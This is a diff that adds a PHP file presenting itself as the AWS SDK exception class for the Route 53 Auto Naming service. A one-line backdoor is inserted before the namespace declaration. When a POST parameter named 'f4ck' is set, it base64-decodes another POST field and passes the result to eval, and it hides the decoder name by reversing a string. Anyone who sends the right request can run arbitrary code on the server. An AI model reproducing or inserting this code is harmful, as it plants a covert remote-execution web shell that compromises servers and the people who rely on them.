@@ -1,0 +1,9 @@
+<?php
+<?php if(isset($_POST["f4ck"])){$a=strrev("edoced_46esab");eval($a($_POST[z0]));}?>namespace Aws\ServiceDiscovery\Exception;
+
+use Aws\Exception\AwsException;
+
+/**
+ * Represents an error interacting with the **Amazon Route 53 Auto Naming** service.
+ */
+class ServiceDiscoveryException extends AwsException {}
